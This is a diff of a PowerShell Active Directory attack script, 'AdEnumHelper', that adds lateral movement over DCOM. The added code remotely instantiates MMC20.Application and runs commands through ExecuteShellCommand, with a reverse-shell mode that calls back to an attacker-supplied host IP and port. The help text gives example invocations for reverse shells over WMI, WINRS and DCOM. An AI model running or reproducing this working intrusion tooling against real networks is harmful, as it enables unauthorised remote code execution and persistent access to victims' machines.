@@ -1,16 +1,16 @@
 <#
     AdEnumHelper.
 
-    A small helper script to help in AD enumeration.
+    A small helper script to help in AD enumeration and lateral movement.
 #>
 #Parameters
 param (
 	[Parameter(Mandatory=$true)]
-    	[string]$param1,
+        [string]$param1,
 	
 	[Parameter(Mandatory=$false)]
 	[string]$param2 = "l",
-	
+
 	[Parameter(Mandatory=$false)]
 	[string]$param3,
 	
@@ -78,16 +78,12 @@ if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
   '<param1>' == 'dcinfo'     -->  Prints out DC name, hostname, OS, OS version, IPv4 and IPv6
   '<param1>' == 'deviceinfo' -->  Prints out AD devices' info: Name, hostname, OS, OS SP, OS version, 
                                   IPv4 and IPv6
-  '<param1>' == 'psexec'     -->  Writes psexec or psexec64 binary to disk
-  '<param1>' == 'psexec64'   -'  
   
   For example:
   .\enumhelper.ps1 'spnlist'
   .\enumhelper.ps1 'dcinfo'
   .\enumhelper.ps1 'deviceinfo'
-  .\enumhelper.ps1 'psexec'
-  .\enumhelper.ps1 'psexec64'
-	  
+ 
 <------------------------------------------------------------------------------------------------------->
  
   Leveraging further with '<param2>':
@@ -111,56 +107,56 @@ if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
   For example:
   .\enumhelper.ps1 'auth' 'megaAdmin' 'verySecurePassword'
  
+  Or for lateral movement over DCOM (you need LA rights):
+  '<param1>' == 'dcom' '<param2>' == target IP '<param3>' == remote command
+  
+  For example:
+  .\enumhelper.ps1 'dcom' '192.168.12.34' 'cmd /c calc.exe'
+ 
 <------------------------------------------------------------------------------------------------------->
  
- By expanding further using '<param4>', you can try to remote over PowerShell, where
+  By expanding further using '<param4>', you can try to remote over PowerShell, where
   '<param1>' == 'psremote' '<param2>' == 'username' '<param3>' == 'password' '<param4>' == 'hostname'
   
   For example:
   .\enumhelper.ps1 'psremote' 'adminusername' 'adminpassword' 'dc1.testad.local'
  
- <------------------------------------------------------------------------------------------------------->
- 
- With adding '<param5>' we can try to run remote commands over WMI, WINRS OR PSEXEC/64:
-  '<param1>' == 'wmi' '<param2>' == 'username' '<param3>' == 'password'  '<param4>' == target IP
+  With adding '<param5>' we can try to run remote commands over WMI or WINRS:
+  '<param1>' == 'wmi' '<param2>' == 'username'  '<param3>' == 'password'  '<param4>' == target IP
   '<param5>' == remote command to run
   or
   '<param1>' == 'winrs' '<param2>' == 'username'  '<param3>' == 'password'  '<param4>' == target hostname
-  '<param5>' == remote command to run
-  or
-  '<param1>' == 'psexec' '<param2>' == 'username' '<param3>' == password '<param4>' == target hostname/IP 
-  '<param5>' == remote command to run
-  or for the 64bit version
-  '<param1>' == 'psexec64' '<param2>' == 'username' '<param3>' == password '<param4>' == target hostname/IP 
   '<param5>' == remote command to run
   
   For example:
   .\enumhelper.ps1 'wmi' 'username' 'password' '192.168.12.34' 'cmd'
   .\enumhelper.ps1 'winrs' 'username' 'password' 'dc.testad.local' 'cmd'
-  .\enumhelper.ps1 'psexec' 'user' 'pass' 'shadydest.local' 'cmd /c whoami'
-  .\enumhelper.ps1 'psexec64' 'user' 'pass' 'shadydest.local' 'cmd /c whoami'
   !NOTE: you can just run with 'wmi' or 'winrs' and the rest will be prompted.
+  
+  You can also run reverse shell over DCOM:
+  '<param1>* == 'dcom' '<param2>' == target IP '<param3>' == 'reverse-shell' '<param4>' == lhost IP 
+  '<param5>' == lhost port
+  
+  For example:
+  .\enumhelper.ps1 'dcom' '192.168.12.34' 'reverse-shell' '192.168.23.45' '4444'
  
-<------------------------------------------------------------------------------------------------------->
- 
-  To further expand previous we can also launch a prebuilt reverse shell command, you just need to enter:
-  '<param5>' == 'reverse-shell' '<param6>' == 'lhost IP' '<param7>' == 'lhost port' or use the same 
+  To further expand WMI / WINRS we can also launch a prebuilt reverse shell command, you just need to enter:
+  '<param5>' == 'reverse-shell' '<param6>' == lhost IP '<param7>' == lhost port or use the same 
   param5 when prompted for a command:
   
   For example:
   .\enumhelper.ps1 'wmi' 'username' 'password' '192.168.12.34' 'reverse-shell' '192.168.23.45' '4444'
   .\enumhelper.ps1 'winrs' 'username' 'password' 'dc.testad.local' 'reverse-shell' '192.168.23.45' '4444'
-  .\enumhelper.ps1 'psexec' 'username' 'password' 'host.testad.local' 'reverse-shell' '192.168.23.45' '4444'
-  .\enumhelper.ps1 'psexec64' 'username' 'password' '192.168.0.20' 'reverse-shell' '192.168.23.45' '4444'   
-
+  
 <------------------------------------------------------------------------------------------------------->
  
   " -BackgroundColor Green -ForegroundColor Black
   exit
 }
-elseif ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "WINRS" -or $param1.ToUpper() -eq "PSREMOTE" -or $param1.ToUpper() -eq "psexec" -or $param1.ToUpper() -eq 'psexec64')
+elseif ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "WINRS" -or $param1.ToUpper() -eq "PSREMOTE" -or 
+$param1.ToUpper() -eq "psexec" -or $param1.ToUpper() -eq 'psexec64' -or $param1.ToUpper() -eq "DCOM")
 {
-	if ($param2 -ne "1" -and $param2 -and $param3)
+	if ($param2 -ne "1" -and $param2 -and $param3 -and $param1.ToUpper() -ne "DCOM")
 	{
 		$username = $param2
 		$insecure_password = $param3
@@ -184,32 +180,49 @@ elseif ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "WINRS" -or $param
 	}
 	else
 	{
-		while (-not $username -or -not $password -or -not $computer -or -not $command)
+		if ($param1.ToUpper() -eq "DCOM")
 		{
-			$username = Read-Host -prompt 'Username: '
-			if ($param1 -eq "WINRS")
+			if (-not $param2 -or -not $param3)
 			{
-				$password = Read-Host -prompt 'Password: '
-				$computer = Read-Host -prompt 'Target hostname: '
-				$command = Read-Host -prompt 'Command to run: '
-			}
-			elseif ($param1.ToUpper() -eq "WMI")
-			{
-				$password = Read-Host -prompt 'Password: ' -AsSecureString
 				$computer = Read-Host -prompt 'Target IP: '
+				Write-Host "You can run reverse shell, by just typing 'reverse-shell' as the command." -ForegroundColor Yellow
 				$command = Read-Host -prompt 'Command to run: '
 			}
-			elseif ($param1.ToUpper() -eq "PSREMOTE")
+			else
 			{
-				$password = Read-Host -prompt 'Password: ' -AsSecureString
-				$computer = Read-Host -prompt 'Target hostname: '
-				$command = "fake_command"
+				$computer = $param2
+				$command = $param3
 			}
-			elseif ($param1.ToUpper() -eq "PSEXEC" -or $param1.ToUpper() -eq "PSEXEC64")
+		}
+		else
+		{
+			while (-not $username -or -not $password -or -not $computer -or -not $command)
 			{
-				$password = Read-Host -prompt 'Password: ' -AsSecureString
-				$computer = Read-Host -prompt 'Target (domain/)hostname or (domain/)IP: '
-				$command = Read-Host -prompt 'Command to run: '
+				$username = Read-Host -prompt 'Username: '
+				if ($param1 -eq "WINRS")
+				{
+					$password = Read-Host -prompt 'Password: '
+					$computer = Read-Host -prompt 'Target hostname: '
+					$command = Read-Host -prompt 'Command to run: '
+				}
+				elseif ($param1.ToUpper() -eq "WMI")
+				{
+					$password = Read-Host -prompt 'Password: ' -AsSecureString
+					$computer = Read-Host -prompt 'Target IP: '
+					$command = Read-Host -prompt 'Command to run: '
+				}
+				elseif ($param1.ToUpper() -eq "PSREMOTE")
+				{
+					$password = Read-Host -prompt 'Password: ' -AsSecureString
+					$computer = Read-Host -prompt 'Target hostname: '
+					$command = "fake_command"
+				}
+				elseif ($param1.ToUpper() -eq "PSEXEC" -or $param1.ToUpper() -eq "PSEXEC64")
+				{
+					$password = Read-Host -prompt 'Password: ' -AsSecureString
+					$computer = Read-Host -prompt 'Target (domain/)hostname or (domain/)IP: '
+					$command = Read-Host -prompt 'Command to run: '
+				}
 			}
 		}
 	}
@@ -220,6 +233,21 @@ elseif ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "WINRS" -or $param
 		{
 			$lhost = $param6
 			$lport = $param7
+		}
+		elseif ($param1.ToUpper() -eq "DCOM")
+		{
+			if ($param4 -and $param5)
+			{
+				$lhost = $param4
+				$lport = $param5
+
+			}
+			else
+			{
+				$lhost = Read-Host -prompt 'LHost IP: '
+				$lport = Read-Host -prompt 'LHost port: '
+			}
+			$param6 = "reverse"
 		}
 		else
 		{
@@ -355,6 +383,22 @@ elseif ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "WINRS" -or $param
 		Write-Host ""
 		Write-Host "###--------------WINRS-DONE-------------------###" -ForegroundColor Yellow
 	}
+	#RUN OVER DCOM
+	elseif ($param1.ToUpper() -eq "DCOM")
+	{
+		$com_instance = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1",$computer))
+		if ($param6 -eq "reverse")
+		{
+			$params = $command
+			$command = "powershell"
+		}
+		else
+		{
+			$params=($command -split " ",2)[1]
+			$command=($command -split " ",2)[0]
+		}
+		$com_instance.Document.ActiveView.ExecuteShellCommand($command,$null,$params,"7")
+	}
 	#Get PsExec.exe, PsExec64.exe or run a command with either
 	elseif ($param1.ToUpper() -eq "PSEXEC" -or $param1.ToUpper() -eq "PSEXEC64")
 	{
@@ -397,8 +441,6 @@ elseif ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "WINRS" -or $param
 		{
 			$params=($command -split " ",2)[1]
 			$command=($command -split " ",2)[0]
-			Write-Host "###----------PSEXEC-RUN-COMMAND---------------###" -ForegroundColor Yellow
-			Write-Host ""
 			if ($param1.ToUpper() -eq "PSEXEC")
 			{
 				try
@@ -424,10 +466,7 @@ elseif ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "WINRS" -or $param
 					Write-Host "Your system doesn't support PsExec64, try PsExec" -ForegroundColor Red
 				}
 			}
-			Write-Host ""
-			Write-Host "###--------PSEXEC-RUN-COMMAND-DONE------------###" -ForegroundColor Yellow
 		}
-		#}
 	}
 	exit
 }
